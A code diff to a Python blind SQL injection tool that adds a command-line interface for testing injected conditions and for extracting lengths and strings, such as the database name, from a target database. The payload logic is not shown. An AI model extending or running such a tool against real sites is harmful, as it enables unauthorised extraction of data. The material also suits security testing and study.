@@ -4,6 +4,7 @@ import requests
 from urllib.parse import quote_plus
 from time import time
 from itertools import chain
+from argparse import ArgumentParser
 
 
 class Blind():
@@ -62,8 +63,28 @@ class Blind():
 
 		return string
 
+	def test(self, cond):
+		if cond:
+			return self.send(self.make_payload(cond))
+
+
+def get_args():
+	parser = ArgumentParser()
+	parser.add_argument('-t', '--test', help='Condition to test')
+	parser.add_argument('-l', '--length', help='Get length of element')
+	parser.add_argument('-s', '--string', help='Get the string')
+
+	return parser.parse_args()
+
 
 if __name__ == '__main__':
+	args = get_args()
 	b = Blind()
 
-	print(b.get_string('DATABASE()'))
+	# print(b.get_string('DATABASE()'))
+	if args.test:
+		print(b.test(args.test))
+	if args.length:
+		print(b.get_length(args.length))
+	if args.string:
+		print(b.get_string(args.string))
